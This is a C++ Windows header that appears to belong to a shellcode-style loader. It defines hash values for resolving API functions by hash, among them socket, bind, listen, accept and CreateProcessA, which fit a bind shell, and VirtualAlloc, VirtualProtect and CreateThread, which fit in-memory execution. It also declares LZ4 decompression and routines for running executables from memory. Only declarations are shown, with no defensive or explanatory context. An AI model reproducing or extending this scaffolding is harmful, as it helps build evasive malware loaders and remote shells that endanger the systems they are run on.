#include <Windows.h>
#ifndef _ONE


DWORD64 GetFunAddrByHash(int nHashDigest);
#define DefineFuncPtr(name,base) decltype(name) *My_##name = (decltype(name)*)GetFunAddrByHash(HASH_##name,base)

#define HASH_LoadLibraryExA 0xC0D83287
#define HASH_ExitProcess    0x4FD18963
#define HASH_WSAStartup     0x80B46A3D
#define HASH_WSASocketA     0xDE78322D
#define HASH_htons          0xDDBFA6F3
#define HASH_bind           0xDDA71064
#define HASH_listen         0x4BD39F0C
#define HASH_accept         0x01971EB1
#define HASH_CreateProcessA 0x6BA6BCC9


#define HASH_sprintf 0x067B4F95
#define HASH_VirtualAlloc 0x1EDE5967
#define HASH_VirtualProtect 0xEF64A41E
#define HASH_CreateThread 0x2729F8BB
#define HASH_WaitForSingleObject 0x2216AFCA
#define HASH_GetProcAddress		0xBBAFDF85
#define HASH_memcpy		0x818F6ED7
#define HASH_printf		0xE9BB4F94
#define HASH_MessageBoxA 0x1E380A6A
#define HASH_LoadLibraryA 0x0C917432



extern "C" void* __cdecl B_memcpy(void* dst, const void* src, size_t count);

extern "C" int LZ4_decompress_generic(
	const char* source,
	char* dest,
	int inputSize,
	int outputSize,         /* If endOnInput==endOnInputSize, this value is the max size of Output Buffer. */
	int endOnInput,         /* endOnOutputSize,*/
	int prefix64k,          /* noPrefix,*/
	int partialDecoding,    /* full,*/
	int targetOutputSize    /* 0,*/
);


DWORD64 GetFunAddrByHash(int nHashDigest, HMODULE hModule);

DWORD Hash_GetDigest(char* strFunName);
bool Hash_CmpString(char* strFunName, int nHash);


bool _Is_64Peformat(char* lpPeBufer);
char* RetX64RunExeAdr(char* pExeAddr, HMODULE Kernel32);
char* RetX32RunExeAdr(char* pExeAddr, HMODULE Kernel32);


#endif // _ONE

